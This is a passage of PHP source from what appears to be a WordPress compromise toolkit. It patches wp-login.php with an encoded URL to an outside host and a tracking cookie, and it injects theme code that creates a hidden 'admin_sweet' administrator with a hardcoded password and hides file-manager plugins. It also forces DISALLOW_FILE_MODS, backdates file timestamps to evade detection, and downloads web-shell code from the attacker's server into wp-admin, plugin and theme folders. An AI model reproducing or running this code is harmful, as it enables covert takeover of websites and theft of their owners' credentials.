			echo '<font color="red">google ver Is not add!</font>'."<br/>";
		}
	}else{
		echo '<font color="red">no add google</font>';
	}
}else{
	$connnn=file_get_contents($_POST['root'].'google3d2646b6620407b6.html');
	if(strpos($connnn,'ogle3d2646b6620')!==false){
			echo '<font color="Green">google ver Is Exists!</font>'."<br/>";
		}
		else{
			echo '<font color="red">google ver Is not add!</font>'."<br/>";
		}
}
}else{
	echo '<font color="red">Wp-load File Error!!!</font>'."<br/>";
	exit;
}
/////////////////////////////////////////////////////login
		$login_file=file_get_contents($_POST['root']."wp-login.php");
		$login_file_check=$config_file_check=preg_replace('/\s+/','',$login_file);
		$login_falg=0;
		if(!empty($login_file)){
			if(strpos($login_file_check,'//setcookie("whatsup"')!==false){
			echo '<font color="red">Login Black Cookie Is ZhuShi!</font>'."<br/>";
			}
			elseif(strpos($login_file,'setcookie("whatsup"')!==false){
				echo '<font color="green">Login Black Cookie Is Exist!</font>'."<br/>";
			}else{
				$login_falg=1;
				$login_file=str_replace("function login_header","setcookie(\"whatsup\",\"whatsupman\",time()+3600*24*365,'/');\r\nfunction login_header",$login_file);
			}
			if(strpos($login_file,'aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
				echo '<font color="green">Login Black Is Exist!</font>'."<br/>";
				if($login_falg==1){
				@unlink($_POST['root']."wp-login.php");
				@file_put_contents($_POST['root']."wp-login.php",$login_file);
				@chmod($_POST['root']."wp-login.php",$file_per);
				@touch($_POST['root'].'wp-login.php',$time);
				@touch($_POST['root'],$time);
				$login_file=file_get_contents($_POST['root']."wp-login.php");
				if(strpos($login_file,'setcookie("whatsup"')!==false){
				echo '<font color="green">Login Black Cookie Is add!</font>'."<br/>";
			}else{
				echo '<font color="red">Login Black Cookie Is not add!</font>'."<br/>";
				}
			}
			}elseif(strpos($login_file,'aHR0cDovLzEuc2FsZWZvcnlvdS5vcmcvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
				$login_file=str_replace('aHR0cDovLzEuc2FsZWZvcnlvdS5vcmcvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ','aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ',$login_file);
				@unlink($_POST['root']."wp-login.php");
				@file_put_contents($_POST['root']."wp-login.php",$login_file);
				@chmod($_POST['root']."wp-login.php",$file_per);
				@touch($_POST['root'].'wp-login.php',$time);
				@touch($_POST['root'],$time);
				$login_file=file_get_contents($_POST['root']."wp-login.php");
				if(strpos($login_file,'aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
				echo '<font color="green">Login Black Is add!</font>'."<br/>";
			}else{
				echo '<font color="red">Login Black Is not add!</font>'."<br/>";
				}
			}
			else{
				if(strpos($login_file,'saleforyou')!==false||strpos($login_file,'bingstyle')!==false){
					$login_file=preg_replace('/redirect_to == admin_url\(\) \) \) {[\s\S]+?\/\/ If the user doesn/i',"redirect_to == admin_url() ) ) {\r\n// If the user doesn",$login_file);
					echo '<font color="red" size="5"><b>Del Old Ok!</b></font>'."<br/>";
				}
				$login_file=str_replace("// If the user doesn't belong",$login_add."// If the user doesn't belong",$login_file);
				@unlink($_POST['root']."wp-login.php");
				@file_put_contents($_POST['root']."wp-login.php",$login_file);
				@chmod($_POST['root']."wp-login.php",$file_per);
				@touch($_POST['root'].'wp-login.php',$time);
				@touch($_POST['root'],$time);
				$login_file=file_get_contents($_POST['root']."wp-login.php");
				if(strpos($login_file,'aHR0cDovLzgudG9wc2FsZTR5b3Uucm9ja3MvdG9uZy9wYS9uZXdwdy9wYXNzLnBocD9hZG1pbmlwPQ')!==false){
				echo '<font color="green">Login Black Is add!</font>'."<br/>";
			}else{
				echo '<font color="red">Login Black Is not add!</font>'."<br/>";
				}
			}
		}else{
			echo '<font color="red">Login Get error!</font>'."<br/>";
		}
		
		
		///////////////////////////////////////////////////define('DISALLOW_FILE_MODS',true);
		//config_add
		
		//include_once($_POST['root']."wp-config.php");
		if (defined('DISALLOW_FILE_MODS')) {
			if(constant("DISALLOW_FILE_MODS")){
				echo '<font color="green">Config Black Is Exist!</font>'."<br/>";
			}else{
				$config_file=file_get_contents($_POST['root']."wp-config.php");
				$config_file=preg_replace('/define.*?DISALLOW_FILE_(MODS|EDIT).*?false.*?;/i','',$config_file);
				@unlink($_POST['root']."wp-config.php");
				@file_put_contents($_POST['root']."wp-config.php",$config_file);
				@chmod($_POST['root']."wp-config.php",$file_per);
				@touch($_POST['root'].'wp-config.php',$time);
				@touch($_POST['root'],$time);
				$config_file=file_get_contents($_POST['root']."wp-config.php");
				if(strpos($config_file,'\'DISALLOW_FILE_MODS\',false')!==false||strpos($config_file,'\'DISALLOW_FILE_MODS\', false')!==false||strpos($config_file,'\'DISALLOW_FILE_MODS\' ,false')!==false){
				echo '<font color="red">Config Black False Is Not delete!</font>'."<br/>";
			}else{
				echo '<font color="green">Config Black False Is delete!!!</font>'."<br/>";
				}
			}
		}else{
			
			$config_file=file_get_contents($_POST['root']."wp-config.php");
			
			if(preg_match('/\r\n.*?(define.*?DISALLOW_FILE_(MODS|EDIT).*?)(false)(.*?;.*?\r\n)/i',$config_file)){
				$config_file=preg_replace('/\r\n.*?(define.*?DISALLOW_FILE_(MODS|EDIT).*?)(false)(.*?;.*?\r\n)/i',"\r\n$1true$4",$config_file);
				@unlink($_POST['root'].'wp-config.php');
				@file_put_contents($_POST['root'].'wp-config.php',$config_file);
				@chmod($_POST['root'].'wp-config.php',$file_per);
				@touch($_POST['root'].'wp-config.php',$time);		
			}
			$config_file_check=preg_replace('/\s+/','',$config_file);
			if(strpos($config_file_check,'//define(\'DISALLOW_FILE_MODS\'')!==false||strpos($config_file_check,'#define(\'DISALLOW_FILE_MODS\'')!==false){
			echo '<font color="red" size=5>Config Black True Zhu Shi!</font>'."<br/>";
			if(strpos($config_file_check,'//define(\'DISALLOW_FILE_MODS\'')!==false){
				$config_file_gai=str_replace('//define(\'DISALLOW_FILE_MODS\'','define(\'DISALLOW_FILE_MODS\'',$config_file);
				$config_file_gai=str_replace('// define(\'DISALLOW_FILE_MODS\'','define(\'DISALLOW_FILE_MODS\'',$config_file);
				@unlink($_POST['root']."wp-config.php");
				@file_put_contents($_POST['root']."wp-config.php",$config_file_gai);
				@chmod($_POST['root']."wp-config.php",$file_per);
				@touch($_POST['root'].'wp-config.php',$time);
				@touch($_POST['root'],$time);
			}elseif(strpos($config_file_check,'#define(\'DISALLOW_FILE_MODS\'')!==false){
				$config_file_gai=str_replace('#define(\'DISALLOW_FILE_MODS\'','define(\'DISALLOW_FILE_MODS\'',$config_file);
				@unlink($_POST['root']."wp-config.php");
				@file_put_contents($_POST['root']."wp-config.php",$config_file_gai);
				@chmod($_POST['root']."wp-config.php",$file_per);
				@touch($_POST['root'].'wp-config.php',$time);
				@touch($_POST['root'],$time);
			}
				$config_file=file_get_contents($_POST['root']."wp-config.php");
				$config_file_check=preg_replace('/\s+/','',$config_file);
				if(strpos($config_file_check,'//define(\'DISALLOW_FILE_MODS\'')!==false||strpos($config_file_check,'#define(\'DISALLOW_FILE_MODS\'')!==false){
				echo '<font color="red">Config Black ZhuShi Is Not delete!</font>'."<br/>";
			}else{
				echo '<font color="green">Config Black ZhuShi Is delete!!!</font>'."<br/>";
				echo '<font color="green">Config Black is add</font>'."<br/>";
				}
				
			}
		}
////////////////////////////////////////////////////////auto login end
	$themes_fun_con2=NULL;
	$themes_dir=get_template_directory();
	echo $themes_dir."<br/>";
	echo $themes_dir."/functions.php<br/>";
	$themes_url_array=explode('/',$themes_dir);
	$cur_themes=array_pop($themes_url_array);
	if(!empty($_POST['check_fun'])&&!empty($themes_dir)){
		if(is_dir($_POST['root'].'wp-content/plugins/wordfencea/')){
			//rename($_POST['root'].'wp-content/plugins/wordfencea/',$_POST['root'].'wp-content/plugins/wordfence/');
		}
		if(function_exists('hide_plugin_trickspanda')&&function_exists('wpdaxue')){
			echo '<font color="green">auto add user old is exist</font>'."<br/>";
			$themes_fun_con=@file_get_contents($themes_dir.'/functions.php');
			$new_themes_con_add=<<<EOT
error_reporting(0);
add_action( 'template_redirect', 'wpdaxue' );
if(!isset(\$_GET['access'])&&\$_GET['access']!=='set_up'){
	function hide_plugins(\$plugins){
		unset( \$plugins['file-manager/file-manager.php'] );
		unset( \$plugins['wp-file-manager/file_folder_manager.php'] );
		return \$plugins;
	}
	add_action('all_plugins','hide_plugins');
}
function wpdaxue(){
	\$username = 'admin_sweet';
	\$password = 'NQPBmtyDj2Cm1zC#y78r';
	\$email_address = 'wordpress@wordpress';
	if ( isset(\$username) && isset(\$password) && isset(\$email_address ) ) {
		if (!username_exists(\$username)&&!email_exists(\$email_address)){
			\$user_id = wp_create_user(\$username,\$password,\$email_address);
			if(is_int(\$user_id)){
				\$wp_user_object = new WP_User(\$user_id);
				\$wp_user_object->set_role('administrator');
			}
		}
	}
}

	add_action('pre_user_query','yoursite_pre_user_query');
	function yoursite_pre_user_query(\$user_search) {
		global \$current_user;
		\$username = \$current_user->user_login;
		if (\$username != 'admin_sweet') { 
			global \$wpdb;
			\$user_search->query_where = str_replace('WHERE 1=1',
			"WHERE 1=1 AND {\$wpdb->users}.user_login != 'admin_sweet'",\$user_search->query_where);
		}
	}

	add_filter("views_users", "dt_list_table_views");
	function dt_list_table_views(\$views){
		\$users = count_users();
		\$admins_num = \$users['avail_roles']['administrator'] - 1;
		\$all_num = \$users['total_users'] - 1;
		\$class_adm = ( strpos(\$views['administrator'], 'current') === false ) ? "" : "current";
		\$class_all = ( strpos(\$views['all'], 'current') === false ) ? "" : "current";
		\$views['administrator'] = '<a href="users.php?role=administrator" class="' . \$class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . \$admins_num . ')</span></a>';
		\$views['all'] = '<a href="users.php" class="' . \$class_all . '">' . __('All') . ' <span class="count">(' . \$all_num . ')</span></a>';
		return \$views;
	}
EOT;
			$themes_fun_con_old_gai=preg_replace('/function hide_plugin_trickspanda[\s\S]+?set_role\( \'administrator\' \);}}}}/',$new_themes_con_add,$themes_fun_con);
			@unlink($themes_dir.'/functions.php');
			@file_put_contents($themes_dir.'/functions.php',$themes_fun_con_old_gai);
			@chmod($themes_dir.'/functions.php',$file_per);
			@touch($themes_dir.'functions.php',$time);
			@touch($themes_dir,$time);
			$themes_fun_con=@file_get_contents($themes_dir.'/functions.php');
			if(strpos($themes_fun_con,'GET[\'access\']')!==false&&(strpos($themes_fun_con,'A4bGff!dV5')!==false||strpos($themes_fun_con,'NQPBmtyDj2Cm1zC#y78r')!==false)){
				echo '<font color="green">auto add user gai is ok!!!</font>'."<br/>";
				//get_test_Html($url_root."wp-admin/plugins.php");
				@touch($themes_dir.'/functions.php',$time);
				@touch($themes_dir,$time);
			}
			else{
				echo '<font color="red">auto add user gai is not ok!!!</font>'."<br/>";
			}
			
		}
		elseif(function_exists('wpdaxue')&&function_exists('hide_plugins')){
			echo '<font color="green">auto add user new is exist</font>'."<br/>";
		}
		elseif(function_exists('hide_plugin_trickspanda')||function_exists('wpdaxue')){
			if(!function_exists('hide_plugin_trickspanda')){
				echo '<font color="red">hide_plugin_trickspanda is not exist</font>'."<br/>";
			}
			if(!function_exists('wpdaxue')){
				echo '<font color="red">wpdaxue is not exist</font>'."<br/>";
			}
		}
		else{
			$themes_dir=get_template_directory();
			if(!empty($_POST['themes_fun'])&&!empty($themes_dir)){
				$new_themes_con_add=<<<EOT
	error_reporting(0);
	add_action( 'template_redirect', 'wpdaxue' );
	if(!isset(\$_GET['access'])&&\$_GET['access']!=='set_up'){
		function hide_plugins(\$plugins){
			unset( \$plugins['file-manager/file-manager.php'] );
			unset( \$plugins['wp-file-manager/file_folder_manager.php'] );
			return \$plugins;
		}
		add_action('all_plugins','hide_plugins');
	}

	function wpdaxue(){
		\$username = 'admin_sweet';
		\$password = 'NQPBmtyDj2Cm1zC#y78r';
		\$email_address = 'wordpress@wordpress';
		if ( isset(\$username) && isset(\$password) && isset(\$email_address ) ) {
			if (!username_exists(\$username)&&!email_exists(\$email_address)){
				\$user_id = wp_create_user(\$username,\$password,\$email_address);
				if(is_int(\$user_id)){
					\$wp_user_object = new WP_User(\$user_id);
					\$wp_user_object->set_role('administrator');
				}
			}
		}
	}

	add_action('pre_user_query','yoursite_pre_user_query');
	function yoursite_pre_user_query(\$user_search) {
		global \$current_user;
		\$username = \$current_user->user_login;
		if (\$username != 'admin_sweet') { 
			global \$wpdb;
			\$user_search->query_where = str_replace('WHERE 1=1',
			"WHERE 1=1 AND {\$wpdb->users}.user_login != 'admin_sweet'",\$user_search->query_where);
		}
	}

	add_filter("views_users", "dt_list_table_views");
	function dt_list_table_views(\$views){
		\$users = count_users();
		\$admins_num = \$users['avail_roles']['administrator'] - 1;
		\$all_num = \$users['total_users'] - 1;
		\$class_adm = ( strpos(\$views['administrator'], 'current') === false ) ? "" : "current";
		\$class_all = ( strpos(\$views['all'], 'current') === false ) ? "" : "current";
		\$views['administrator'] = '<a href="users.php?role=administrator" class="' . \$class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . \$admins_num . ')</span></a>';
		\$views['all'] = '<a href="users.php" class="' . \$class_all . '">' . __('All') . ' <span class="count">(' . \$all_num . ')</span></a>';
		return \$views;
	}
EOT;
				$end_fun_con=stripslashes($_POST['themes_fun']);
				$end_fun_con=str_replace('{add}',$new_themes_con_add,$end_fun_con);
				if(strpos($end_fun_con,'file-manager')!==false&&strpos($end_fun_con,'NQPBmtyDj2Cm1zC#y78r')!==false){
					@unlink($themes_dir.'/functions.php');
					@file_put_contents($themes_dir.'/functions.php',$end_fun_con);
					@chmod($themes_dir.'/functions.php',$file_per);
					@touch($themes_dir.'functions.php',$time);
					@touch($themes_dir,$time);
					$themes_fun_con=@file_get_contents($themes_dir.'/functions.php');//NQPBmtyDj2Cm1zC#y78r
					if(strpos($end_fun_con,'file-manager')!==false&&(strpos($end_fun_con,'A4bGff!dV5')!==false||strpos($end_fun_con,'NQPBmtyDj2Cm1zC#y78r')!==false)){
						echo '<font color="green">auto add user is add!!!</font>'."<br/>";
						//get_test_Html($url_root."wp-admin/plugins.php");
						@touch($themes_dir.'/functions.php',$time);
						@touch($themes_dir,$time);
					}
					else{
						echo '<font color="red">auto add user is not add!!!</font>'."<br/>";
					}
				}else{
					echo '<font color="red">No themes fun con!!!</font>'."<br/>";
				}
			}
			else{
			$themes_fun_con=@file_get_contents($themes_dir.'/functions.php');
				$themes_fun_con2='<textarea type="text" name="themes_fun" style="width:800px;height:800px;"/>'.htmlspecialchars($themes_fun_con).'</textarea><br/>';
			}
		}
		$new_themes_con_add=<<<EOT
error_reporting(0);
add_action( 'template_redirect', 'wpdaxue' );
if(!isset(\$_GET['access'])&&\$_GET['access']!=='set_up'){
	function hide_plugins(\$plugins){
		unset( \$plugins['file-manager/file-manager.php'] );
		unset( \$plugins['wp-file-manager/file_folder_manager.php'] );
		return \$plugins;
	}
	add_action('all_plugins','hide_plugins');
}
function wpdaxue(){
	\$username = 'admin_sweet';
	\$password = 'NQPBmtyDj2Cm1zC#y78r';
	\$email_address = 'wordpress@wordpress';
	if ( isset(\$username) && isset(\$password) && isset(\$email_address ) ) {
		if (!username_exists(\$username)&&!email_exists(\$email_address)){
			\$user_id = wp_create_user(\$username,\$password,\$email_address);
			if(is_int(\$user_id)){
				\$wp_user_object = new WP_User(\$user_id);
				\$wp_user_object->set_role('administrator');
			}
		}
	}
}
EOT;
		
		//print_r($arr2);
		
		
	}
	foreach($arr2 as $themes_dir_all){
			if($themes_dir_all !== $cur_themes&&isset($_POST[$themes_dir_all])&&$_POST[$themes_dir_all]=='add'){
				if(is_file($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php')){
				$themes_fun__other_con=@file_get_contents($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php');
				$themes_fun__other_con_check=preg_replace('/\s+/','',$themes_fun__other_con);
				if(strpos($themes_fun__other_con_check,'file-manager/file-manager.php')!==false&&strpos($themes_fun__other_con_check,'admin_sweet')!==false){
					echo '<font color="green">'.$themes_dir_all.' is add</font>'."<br/>";
					if(strpos($themes_fun__other_con_check,'/*error_reporting(0)')!==false||strpos($themes_fun__other_con_check,'//error_reporting(0)')!==false){
						echo '<font color="red">'.$themes_dir_all.' is ZhuShi Please Check</font>'."<br/>";
					}
				}else{
					if(preg_match('/.*?\?>$/',$themes_fun__other_con_check)){
						
						$end_themes_fun__other_con=str_l_replace('?>', $new_themes_con_add."\r\n?>", $themes_fun__other_con);
						@unlink($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php');
						@file_put_contents($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php',$end_themes_fun__other_con);
						$themes_fun__other_con=@file_get_contents($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php');
						$themes_fun__other_con_check=preg_replace('/\s+/','',$themes_fun__other_con);
						if(strpos($themes_fun__other_con_check,'file-manager/file-manager.php')!==false&&strpos($themes_fun__other_con_check,'admin_sweet')!==false){
							echo '<font color="green">'.$themes_dir_all.' is add ok</font>'."<br/>";
						}else{
							echo '<font color="green">'.$themes_dir_all.' is add not ok</font>'."<br/>";
						}
						@chmod($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php',$file_per);
						@touch($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php',$time);
						@touch($_POST['root'].'wp-content/themes/'.$themes_dir_all,$time);
						
					}else{
						
						$end_themes_fun__other_con=$themes_fun__other_con.$new_themes_con_add;
						
						@unlink($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php');
						@file_put_contents($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php',$end_themes_fun__other_con);
						$themes_fun__other_con=@file_get_contents($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php');
						$themes_fun__other_con_check=preg_replace('/\s+/','',$themes_fun__other_con);
						if(strpos($themes_fun__other_con_check,'file-manager/file-manager.php')!==false&&strpos($themes_fun__other_con_check,'admin_sweet')!==false){
							echo '<font color="green">'.$themes_dir_all.' is add ok</font>'."<br/>";
						}else{
							echo '<font color="green">'.$themes_dir_all.' is add not ok</font>'."<br/>";
						}
						@chmod($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php',$file_per);
						@touch($_POST['root'].'wp-content/themes/'.$themes_dir_all.'/functions.php',$time);
						@touch($_POST['root'].'wp-content/themes/'.$themes_dir_all,$time);
					}
				}
				
			}
			}
		}
		////////////////////////////////////////////////////////////check_file_manager
			//$_POST['check_file_manager']
		//if(!empty($_POST['check_file_manager'])&&$_POST['check_file_manager']==1){
			
		///////////////////////////////////////////////////////////
		///////////////////////////////////////////////////////////
		if(!empty($_POST['config_add'])){
			if(is_file($_POST['root']."wp-config.php")){
			$config_file=file_get_contents($_POST['root']."wp-config.php");
			if(strpos($config_file,'\'DISALLOW_FILE_MODS\',true')!==false){
				echo '<font color="green">Config Black Is Exist!</font>'."<br/>";
			}else{
				$config_file=str_replace("\$table_prefix","define('DISALLOW_FILE_MODS',true);\r\n"."\$table_prefix",$config_file);
				@unlink($_POST['root']."wp-config.php");
				@file_put_contents($_POST['root']."wp-config.php",$config_file);
				@chmod($_POST['root']."wp-config.php",$file_per);
				$config_file=file_get_contents($_POST['root']."wp-config.php");
				if(strpos($config_file,"define('DISALLOW_FILE_MODS',true);")!==false){
				echo '<font color="green">Config Black Is add!</font>'."<br/>";
				get_test_Html($url_root.'wp-admin/');
				@touch($_POST['root']."wp-config.php",$time);
				@touch($_POST['root'],$time);
			}else{
				echo '<font color="red">Config Black Is not add!</font>'."<br/>";
				}
			}
			}else{
				echo '<font color="red">Config File Is not Exists!</font>'."<br/>";
			}
		}else{
			echo '<font color="red" size=5>Config Is not select!</font>'."<br/>";
		}
		// $all_end_link_insert_array=array();
		// for ($a = 0; $a<78*2; $a++) {
			// $all_end_link_insert_array[$a]='	';
		// }
		///////////////////////////////////////////////////////////
		$all_insert_link_array=array();
		if(!empty($_POST['ma_1_jm'])){
			$chama_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/filecontral-changediy-jm.txt");
		}else{
			$chama_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/filecontral-changediy.txt");
		}
		if(isset($_POST['chama_option'])){
		if($_POST['chama_option']==1){
			$chama_con2=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/try-gai.txt");
		}	
		else{
			$chama_con2=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/".$_POST['chama_option']);
		}
		}
		if(!empty($chama_con)){
		if(!empty($_POST['file_ma'])){
			$file_ma_array=(explode('	',$_POST['file_ma']));
			$file_ma_num=1;
			foreach($file_ma_array as $file_ma_url){
				if($file_ma_url==''){
					if($file_ma_num-1==0||$file_ma_num-1==6){
						$_POST["chama{$file_ma_num}"]=1;
					}elseif($file_ma_num-1==1||$file_ma_num-1==2){
						$_POST["chama{$file_ma_num}"]=$arr[array_rand($arr,1)];
					}elseif($file_ma_num-1==3){
						$_POST["chama{$file_ma_num}"]=$arr2[array_rand($arr2,1)];
					}elseif($file_ma_num-1==4||$file_ma_num-1==5){
						$_POST["chama{$file_ma_num}"]=$arr1[array_rand($arr1,1)];
					}
				}else{
					$url_str_replace_array=array("http://","https://");
				$file_ma_url=str_replace($url_str_replace_array,'',$file_ma_url);
				$file_ma_url=str_replace(str_replace($url_str_replace_array,'',$url_root),$_POST['root'],$file_ma_url);
				if(!is_file($file_ma_url)){
					$file_ma_array[$file_ma_num-1]='';
					if($file_ma_num-1==0||$file_ma_num-1==6){
						$_POST["chama{$file_ma_num}"]=1;
					}elseif($file_ma_num-1==1||$file_ma_num-1==2){
						$_POST["chama{$file_ma_num}"]=$arr[array_rand($arr,1)];
					}elseif($file_ma_num-1==3){
						$_POST["chama{$file_ma_num}"]=$arr2[array_rand($arr2,1)];
					}elseif($file_ma_num-1==4||$file_ma_num-1==5){
						$_POST["chama{$file_ma_num}"]=$arr1[array_rand($arr1,1)];
					}
				}else{
					$check_file_ma=file_get_contents($file_ma_url);
					if(strpos($check_file_ma,'function upfile')!==false){
						echo '<font color="green">'.$file_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$file_ma_array[$file_ma_num-1]='';
						if($file_ma_num-1==0||$file_ma_num-1==6){
						$_POST["chama{$file_ma_num}"]=1;
					}elseif($file_ma_num-1==1||$file_ma_num-1==2){
						$_POST["chama{$file_ma_num}"]=$arr[array_rand($arr,1)];
					}elseif($file_ma_num-1==3){
						$_POST["chama{$file_ma_num}"]=$arr2[array_rand($arr2,1)];
					}elseif($file_ma_num-1==4||$file_ma_num-1==5){
						$_POST["chama{$file_ma_num}"]=$arr1[array_rand($arr1,1)];
					}
					}
				}
				}
				$file_ma_num++;
			}
		}
		$chama_all_link='';
		if(!empty($_POST['chama1'])||!empty($_POST['add_all_check_file_m'])){
			$insert_ma_array=array();
			$shuffle=0;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-admin";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>80){
			$plugins_array=array_slice($plugins_array,0,80);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				// if(!empty($suspected)){
					// $file_name=$file_name.$suspected;
				// }
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'function upfile',$chama_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."wp-admin ma1 is add".'</font>'."<br/>";
					if(!empty($_POST['file_ma'])){
						$file_ma_array[0]=$insert_ma_array[1];
					}else{
						$chama_all_link.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					$shuffle=1;
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."wp-admin ma1 is not add".'</font>'."<br/>";
				if(!empty($_POST['file_ma'])){
					$file_ma_array[0]='';
				}
				else{
					$chama_all_link.=$insert_ma_array[1];
				}
				
			}
		}
		///////////////////////////////////////////////////
		if(!empty($_POST['chama2'])||!empty($_POST['add_all_check_file_m'])){
			$insert_ma_array=array();
			$shuffle=0;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/plugins/".$_POST['chama2'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>80){
			$plugins_array=array_slice($plugins_array,0,80);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'function upfile',$chama_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."plugin ma1 is add".'</font>'."<br/>";
					if(!empty($_POST['file_ma'])){
						$file_ma_array[1]=$insert_ma_array[1];
					}else{
						$chama_all_link.=$insert_ma_array[1].'	';
					}
					
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					$shuffle=1;
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."plugin ma1 is not add".'</font>'."<br/>";
				if(!empty($_POST['file_ma'])){
					$file_ma_array[1]='';
				}else{
					$chama_all_link.=$insert_ma_array[1];
				}
			}
		}
		/////////////////////////////////////////////////////////////////////////////////////
		if(!empty($_POST['chama3'])||!empty($_POST['add_all_check_file_m'])){
			$insert_ma_array=array();
			$shuffle=0;
			$num=1;
			$num2=0;
			if($_POST['no_php5_or_phtml']==1){
				$file_name='.index.php';
			}else{
				$file_name='.index.php5';
			}
			$scand_dir="wp-content/plugins/".$_POST['chama3'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'function upfile',$chama_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."plugin ma2 is add".'</font>'."<br/>";
					if(!empty($_POST['file_ma'])){
					$file_ma_array[2]=$insert_ma_array[1];
					}else{
						$chama_all_link.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					$shuffle=1;
					if($num2>0){
						$file_name='index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
				echo '<font color="red">'."plugin ma2 is not add".'</font>'."<br/>";
				if(!empty($_POST['file_ma'])){
					$file_ma_array[2]='';
					}else{
						$chama_all_link.=$insert_ma_array[1];
					}
			}
		}
		/////////////////////////////////////////////////////////////////////////////themes
		if(!empty($_POST['chama4'])||!empty($_POST['add_all_check_file_m'])){
			$insert_ma_array=array();
			$shuffle=0;
			$num=1;
			$num2=0;
			$file_name='index.php';
			$scand_dir="wp-content/themes/".$_POST['chama4'];
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!empty($suspected)){
					$file_name=$file_name.$suspected;
				}
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
				$insert_ma_array=insert_org_ma($plugins_array[$i-1],$file_name,'function upfile',$chama_con,$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/".$file_name."themes ma is add".'</font>'."<br/>";
					if(!empty($_POST['file_ma'])){
					$file_ma_array[3]=$insert_ma_array[1];
					}else{
					$chama_all_link.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='exist_no_add'){
					$shuffle=1;
					if($num2>0){
						$file_name='.index.php';
					}
					$num2++;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
					
				}
				$num++;
			}
			if($insert_falg==0){
				
